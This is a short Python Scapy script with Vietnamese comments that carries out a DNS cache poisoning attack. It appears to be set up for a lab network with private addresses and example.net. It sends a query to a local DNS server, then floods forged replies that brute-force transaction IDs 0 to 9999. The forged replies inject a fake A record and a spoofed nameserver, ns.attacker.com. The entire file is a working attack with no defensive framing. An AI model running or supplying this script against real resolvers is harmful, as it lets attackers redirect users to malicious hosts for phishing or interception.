from scapy.all import *
import time

local_dns_server = "192.168.195.138"  # Địa chỉ Local DNS Server
attacker_ip = "192.168.195.130"       # Địa chỉ IP của máy tấn công
fake_ip = "1.2.3.4"                   # Địa chỉ IP giả mạo trả về cho www.example.net
fake_ns = "ns.attacker.com"            # Nameserver giả mạo

def send_dns_request():
    Qdsec = DNSQR(qname="www.example.net")
    dns = DNS(id=0xAAAA, qr=0, qdcount=1, ancount=0, nscount=0, arcount=0, qd=Qdsec)
    ip = IP(dst=local_dns_server, src=attacker_ip)
    udp = UDP(dport=53, sport=2052)
    request = ip / udp / dns
    send(request)
    print("[+] Sent DNS Request")

def send_fake_dns_response():
    name = "www.example.net"
    domain = "example.net"
    Qdsec = DNSQR(qname=name)
    Ansec = DNSRR(rrname=name, type="A", rdata=fake_ip, ttl=259200)
    NSsec = DNSRR(rrname=domain, type="NS", rdata=fake_ns, ttl=259200)
    
    for i in range(10000):  # Lặp để tăng xác suất khớp Transaction ID
        dns = DNS(id=i, aa=1, rd=1, qr=1, qdcount=1, ancount=1, nscount=1, arcount=0, 
                  qd=Qdsec, an=Ansec, ns=NSsec)
        ip = IP(dst=local_dns_server, src=attacker_ip)
        udp = UDP(dport=53, sport=2052)
        reply = ip / udp / dns
        send(reply, verbose=False)
        print(f"[+] Sent Fake DNS Response with ID: {i}")

if __name__ == "__main__":
    print("[*] Sending DNS Request...")
    send_dns_request()
    
    time.sleep(1)  # Đợi 1 giây để Local DNS Server xử lý request
    
    print("[*] Sending Fake DNS Responses...")
    send_fake_dns_response()